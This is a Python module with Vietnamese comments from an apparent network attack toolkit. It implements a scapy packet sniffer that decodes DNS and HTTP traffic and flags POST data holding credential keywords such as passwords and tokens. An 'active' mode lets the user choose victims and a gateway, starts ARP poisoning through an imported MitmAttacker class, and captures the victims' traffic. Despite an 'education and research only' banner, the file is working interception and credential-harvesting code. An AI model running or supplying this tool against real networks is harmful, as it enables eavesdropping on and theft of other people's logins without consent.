#!/usr/bin/env python3
"""
Packet Sniffer Module - Nghe lén và phân tích lưu lượng mạng.
*** CẢNH BÁO: CHỈ SỬ DỤNG CHO MỤC ĐÍCH GIÁO DỤC VÀ NGHIÊN CỨU. ***
"""

import threading
import time
import logging
from scapy.all import sniff, IP, TCP, UDP, DNS, DNSQR, DNSRR, Raw, wrpcap, ICMP
from colorama import Fore, Style
from typing import Optional, List
from . import utils
from .mitm import MitmAttacker

class PacketSniffer:
    """
    Lớp đóng gói logic cho việc nghe lén gói tin.
    """
    def __init__(self, interface: str, bpf_filter: str = "", save_pcap: Optional[str] = None):
        self.interface = interface
        self.bpf_filter = bpf_filter
        self.save_pcap = save_pcap
        self.stop_event = threading.Event()
        self.logger = logging.getLogger(__name__)
        self.packets = [] # Để lưu gói tin nếu cần lưu ra file
        self.credentials_keywords = ['user', 'pass', 'login', 'email', 'pwd', 'credential', 'token', 'auth']

    def _parse_dns(self, packet) -> Optional[str]:
        """Phân tích và định dạng thông tin từ gói tin DNS."""
        if not packet.haslayer(DNS):
            return None

        src_ip = packet[IP].src
        dst_ip = packet[IP].dst

        if packet[DNS].qr == 0:  # DNS Query
            try:
                query_name = packet[DNSQR].qname.decode('utf-8')
                return f"{Fore.YELLOW}[DNS Query]{Style.RESET_ALL} {src_ip} -> {dst_ip}: Who is {Fore.CYAN}{query_name}{Style.RESET_ALL}?"
            except (IndexError, AttributeError):
                return None
        elif packet[DNS].qr == 1:  # DNS Response
            try:
                query_name = packet[DNSQR].qname.decode('utf-8')
                answers = []
                if packet.haslayer(DNSRR):
                    for i in range(packet[DNS].ancount):
                        answer = packet[DNSRR][i]
                        if answer.type == 1:  # A record
                            answers.append(f"A={answer.rdata}")
                        elif answer.type == 5:  # CNAME
                            answers.append(f"CNAME={answer.rdata.decode('utf-8')}")
                if answers:
                    return f"{Fore.YELLOW}[DNS Resp.]{Style.RESET_ALL} {src_ip} says: {Fore.CYAN}{query_name}{Style.RESET_ALL} is at {Fore.GREEN}{', '.join(answers)}{Style.RESET_ALL}"
            except (IndexError, AttributeError, UnicodeDecodeError):
                return None
        return None

    def _parse_http(self, packet) -> Optional[str]:
        """Phân tích và định dạng thông tin từ gói tin HTTP."""
        if not (packet.haslayer(TCP) and packet.haslayer(Raw)):
            return None

        if not (packet[TCP].dport == 80 or packet[TCP].sport == 80):
            return None

        try:
            payload = packet[Raw].load.decode('utf-8', errors='ignore')
            http_lines = payload.split('\r\n')
            request_line = http_lines[0]
            src_ip, dst_ip = packet[IP].src, packet[IP].dst
            sport, dport = packet[TCP].sport, packet[TCP].dport

            # HTTP Request
            if any(method in request_line for method in ["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS"]):
                parts = request_line.split(' ')
                if len(parts) < 2: return None
                method, path = parts[0], parts[1]
                host = next((line.split(":", 1)[1].strip() for line in http_lines if line.lower().startswith("host:")), "Unknown")
                
                info = f"{Fore.GREEN}[HTTP Req]{Style.RESET_ALL} {src_ip}:{sport} -> {dst_ip}:{dport} | {Fore.MAGENTA}{method}{Style.RESET_ALL} http://{host}{path}"
                
                if method == "POST":
                    post_data = http_lines[-1]
                    if any(kw in post_data.lower() for kw in self.credentials_keywords):
                        info += f"\n    {Fore.RED}[!] Potential credentials found in POST data: {post_data[:100]}{Style.RESET_ALL}"
                return info

            # HTTP Response
            elif request_line.startswith("HTTP/"):
                status_line = request_line
                content_type = next((line.split(":", 1)[1].strip() for line in http_lines if line.lower().startswith("content-type:")), "Unknown")
                return f"{Fore.BLUE}[HTTP Resp]{Style.RESET_ALL} {src_ip}:{sport} -> {dst_ip}:{dport} | {Fore.CYAN}{status_line}{Style.RESET_ALL} | Type: {content_type.split(';')[0]}"

        except (ValueError, IndexError, UnicodeDecodeError):
            return None
        return None

    def start_sniffing(self):
        """Bắt đầu quá trình nghe lén."""
        self.logger.info(f"Bắt đầu nghe lén trên interface '{self.interface}' với bộ lọc '{self.bpf_filter or 'None'}'...")
        print(f"{Fore.CYAN}[*] Bắt đầu nghe lén... Nhấn Ctrl+C để dừng.{Style.RESET_ALL}")
        
        sniff(
            iface=self.interface,
            filter=self.bpf_filter,
            prn=self._process_packet_detailed,
            store=False, # Không lưu gói tin vào bộ nhớ của scapy để tiết kiệm RAM
            stop_filter=lambda p: self.stop_event.is_set()
        )
        
        self.logger.info("Đã dừng nghe lén.")
        if self.save_pcap and self.packets:
            self.logger.info(f"Đang lưu {len(self.packets)} gói tin vào {self.save_pcap}...")
            wrpcap(self.save_pcap, self.packets)
            print(f"{Fore.GREEN}[+] Đã lưu kết quả vào {self.save_pcap}{Style.RESET_ALL}")

    def _process_packet_detailed(self, packet):
        """Hàm callback để xử lý mỗi gói tin bắt được, với phân tích chi tiết."""
        if self.save_pcap:
            self.packets.append(packet)

        if not packet.haslayer(IP):
            return

        # Thử phân tích các giao thức cụ thể trước
        dns_info = self._parse_dns(packet)
        if dns_info:
            print(dns_info)
            return

        http_info = self._parse_http(packet)
        if http_info:
            print(http_info)
            return

        # Nếu không phải là các giao thức trên, hiển thị thông tin chung
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        
        summary = ""
        if packet.haslayer(TCP):
            summary = f"{Fore.WHITE}TCP: {src_ip}:{packet[TCP].sport} -> {dst_ip}:{packet[TCP].dport} Flags:{packet[TCP].flags}{Style.RESET_ALL}"
        elif packet.haslayer(UDP):
            summary = f"{Fore.WHITE}UDP: {src_ip}:{packet[UDP].sport} -> {dst_ip}:{packet[UDP].dport}{Style.RESET_ALL}"
        elif packet.haslayer(ICMP):
            summary = f"{Fore.WHITE}ICMP: {src_ip} -> {dst_ip} (Type: {packet[ICMP].type}){Style.RESET_ALL}"
        
        if summary:
            print(summary)

def run_sniffer(interface: str, **kwargs):
    """Hàm điều phối cho module sniffer."""
    print(f"\n{Fore.CYAN}=== PACKET SNIFFER MODULE ==={Style.RESET_ALL}")

    # Menu chọn chế độ
    print("Chọn chế độ nghe lén:")
    print(f"  1. {Fore.GREEN}Thụ động (Passive){Style.RESET_ALL} - Chỉ nghe trên card mạng của bạn (an toàn).")
    print(f"  2. {Fore.YELLOW}Chủ động (Active / MitM){Style.RESET_ALL} - Chuyển hướng và nghe lén traffic của thiết bị khác.")

    mode_choice = ""
    while mode_choice not in ['1', '2']:
        try:
            mode_choice = input("\nLựa chọn của bạn (1-2): ")
            if mode_choice not in ['1', '2']:
                print(f"{Fore.RED}Lựa chọn không hợp lệ.{Style.RESET_ALL}")
        except KeyboardInterrupt:
            print("\n[*] Hủy bỏ.")
            return

    bpf_filter = kwargs.get('filter', "")
    save_pcap = kwargs.get('save_pcap', None)

    if mode_choice == '1':
        # --- Chế độ Thụ động (Passive Mode) ---
        print(f"\n{Fore.GREEN}[*] Đã chọn chế độ Thụ động.{Style.RESET_ALL}")
        sniffer = PacketSniffer(interface, bpf_filter=bpf_filter, save_pcap=save_pcap)
        try:
            sniffer.start_sniffing()
        except KeyboardInterrupt:
            print("\n[*] Người dùng yêu cầu dừng...")
        except Exception as e:
            logging.error(f"Lỗi trong quá trình nghe lén thụ động: {e}", exc_info=True)

    elif mode_choice == '2':
        # --- Chế độ Chủ động (Active Mode) ---
        print(f"\n{Fore.YELLOW}[*] Đã chọn chế độ Chủ động (MitM).{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Chế độ này sẽ thực hiện tấn công ARP Poisoning để nghe lén.{Style.RESET_ALL}")

        attacker = None
        try:
            # Sử dụng lại logic chọn mục tiêu từ MitM
            dummy_attacker = MitmAttacker(interface, ["127.0.0.1"], "127.0.0.1")

            all_targets = utils.load_targets_from_scan(dummy_attacker.logger, dummy_attacker.attacker_ip, exclude_router=False, exclude_attacker=True)
            if not all_targets:
                print(f"{Fore.RED}[-] Không tìm thấy thiết bị nào. Vui lòng chạy 'scan' trước.{Style.RESET_ALL}")
                return

            victim_targets = [t for t in all_targets if not t.endswith('.1')]
            if not victim_targets:
                print(f"{Fore.RED}[-] Không có nạn nhân nào phù hợp để tấn công.{Style.RESET_ALL}")
                return
            victim_ips = dummy_attacker._select_targets_from_menu(victim_targets, "CHỌN NẠN NHÂN ĐỂ NGHE LÉN")
            if not victim_ips:
                print("[-] Đã hủy bỏ.")
                return

            gateway_targets = [t for t in all_targets if t not in victim_ips]
            gateway_ip_list = dummy_attacker._select_targets_from_menu(gateway_targets, "CHỌN GATEWAY (ROUTER)")
            if not gateway_ip_list:
                print("[-] Đã hủy bỏ.")
                return
            gateway_ip = gateway_ip_list[0]

            attacker = MitmAttacker(interface=interface, victim_ips=victim_ips, gateway_ip=gateway_ip, enable_sniffing=False)

            if not attacker.start_attack():
                print(f"{Fore.RED}[-] Không thể bắt đầu tấn công ARP Poisoning.{Style.RESET_ALL}")
                return

            victim_filter = "host " + " or host ".join(victim_ips)
            final_filter = f"({victim_filter})"
            if bpf_filter:
                final_filter += f" and ({bpf_filter})"

            sniffer = PacketSniffer(interface, bpf_filter=final_filter, save_pcap=save_pcap)
            sniffer.start_sniffing()

        except KeyboardInterrupt:
            print("\n[*] Người dùng yêu cầu dừng...")
        except Exception as e:
            logging.error(f"Lỗi trong quá trình nghe lén chủ động: {e}", exc_info=True)
        finally:
            if attacker and attacker.is_attacking():
                attacker.stop_attack()